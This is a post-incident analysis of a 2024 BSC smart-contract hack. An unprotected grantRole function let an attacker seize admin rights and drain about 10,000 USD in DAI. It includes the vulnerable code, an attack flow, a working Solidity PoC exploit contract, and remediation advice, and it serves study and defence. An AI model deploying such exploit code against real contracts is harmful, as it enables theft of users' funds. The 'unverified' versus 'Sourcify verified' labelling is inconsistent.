# Unverified Contract 0x667d — Admin Privilege Takeover Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-29 |
| **Protocol** | Unverified Contract (0x667d) |
| **Chain** | BSC |
| **Loss** | ~10,000 USD |
| **Attacker** | [0x847705ee](https://bscscan.com/address/0x847705eeb01b4f2ae9a92be12615c1052f52e7ad) |
| **Attack Tx** | [0x56d3ed5f](https://bscscan.com/tx/0x56d3ed5f635b009e19d693e432479323b23b3eb368cf04e161adbc672a15898e) |
| **Vulnerable Contract** | [0x8de7eaba](https://bscscan.com/address/0x8de7eaba58efb23b6f323984377af582b23134e9) |
| **Root Cause** | The `grantRole` function lacked access control, allowing anyone to grant themselves admin privileges |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/unverified_667d_exp.sol) |

---
## 1. Vulnerability Overview

The unverified contract (0x8DE7E) implemented the AccessControl pattern, but its `grantRole()` function lacked proper validation. The attacker directly called `grantRole(DEFAULT_ADMIN_ROLE, attacker)` to obtain admin privileges, then used the `adminWithdraw()` function to drain the entire DAI balance held by the contract.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable grantRole: no caller validation
function grantRole(bytes32 role, address account) external {
    // ❌ Missing OpenZeppelin's onlyRole(getRoleAdmin(role))
    // Anyone can assign an arbitrary role to themselves
    _roles[role][account] = true;
}

// adminWithdraw: callable by admin only
function adminWithdraw(
    address handlerAddress,
    address tokenAddress,
    address recipient,
    uint256 amountOrTokenID
) external onlyRole(DEFAULT_ADMIN_ROLE) {
    // Admin can withdraw arbitrary tokens
    IERC20(tokenAddress).transferFrom(handlerAddress, recipient, amountOrTokenID);
}

// ✅ Fix: use OpenZeppelin AccessControl standard
// function grantRole(bytes32 role, address account)
//     public override onlyRole(getRoleAdmin(role)) { ... }
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Unverified667d_decompiled.sol
contract Unverified667d {
    function grantRole(bytes32 p0, address p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow

```
Attacker (0x847705ee)
  │
  ├─[1]─▶ Deploy AttackerC
  │
  ├─[2]─▶ vul_addr.grantRole(DEFAULT_ADMIN_ROLE, address(this))
  │         └─ ❌ Admin privilege obtained without any validation
  │
  ├─[3]─▶ vul_addr.adminWithdraw(
  │           header_addr,    // address holding the tokens
  │           dai,            // DAI token
  │           attacker,       // attacker receives funds
  │           10463 DAI       // entire balance
  │         )
  │
  └─[4]─▶ ~10K USD DAI drained
```

## 4. PoC Code

```solidity
contract AttackerC {
    constructor() {
        // ❌ Gain admin privileges via unvalidated grantRole
        (bool s1,) = vul_addr.call(
            abi.encodeWithSelector(
                bytes4(keccak256("grantRole(bytes32,address)")),
                bytes32(0),      // DEFAULT_ADMIN_ROLE
                address(this)    // attacker contract
            )
        );
        require(s1, "grantRole failed");

        // Drain entire DAI balance using admin privileges
        (bool s2,) = vul_addr.call(
            abi.encodeWithSelector(
                bytes4(keccak256("adminWithdraw(address,address,address,uint256)")),
                header_addr,
                dai,
                attacker,
                uint256(10463638549999999999999)
            )
        );
        require(s2, "adminWithdraw failed");
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Vector** | Direct call to `grantRole` |
| **CWE** | CWE-284: Improper Access Control |
| **DASP** | Access Control Vulnerability |
| **Severity** | Critical |

## 6. Remediation Recommendations

1. **OpenZeppelin AccessControl**: Always use the audited reference implementation
2. **Protect `grantRole`**: Role assignment must be restricted to the admin of that role
3. **Deployment Validation**: Test that the role hierarchy is correct at deploy time
4. **Contract Verification**: Source code must be published and verified on a block explorer

## 7. Lessons Learned

- When implementing AccessControl, using the OpenZeppelin library as-is is the safest approach.
- With unverified contracts, it is difficult to know from the outside what vulnerabilities may be lurking.
- Permission-related functions such as `grantRole` must be the top priority in any security review.